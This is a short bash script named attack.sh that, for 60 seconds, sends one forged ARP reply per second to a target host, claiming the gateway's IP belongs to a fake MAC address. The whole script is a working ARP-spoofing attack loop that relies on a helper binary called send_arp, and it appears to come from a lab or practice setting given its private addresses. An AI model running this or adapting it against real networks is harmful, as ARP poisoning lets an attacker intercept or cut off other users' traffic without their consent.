#!/bin/bash
#################################################################
#   Copyright (C) 2015 Sean Guo. All rights reserved.
#
#	> File Name:        < attack.sh >
#	> Author:           < Sean Guo >
#	> Mail:             < iseanxp+code@gmail.com >
#	> Last Changed:     < 2017/05/25 >
#	> Description:
#################################################################

# target host
target_ip="10.42.1.100"
target_mac="00:01:02:03:04:05"

# fake gateway host
gateway="10.42.1.1"
fake_mac="aa:bb:cc:dd:ee:ff"

declare -i seconds
seconds=0
COUNTER=60
while [ $seconds -lt $COUNTER ]
do
  #usage: send_arp src_ip_addr src_hw_addr targ_ip_addr tar_hw_addr number
  sudo ./send_arp $gateway $fake_mac $target_ip $target_mac 1
  echo "send fake arp to $target_ip"
  seconds=$seconds+1
  sleep 1
done
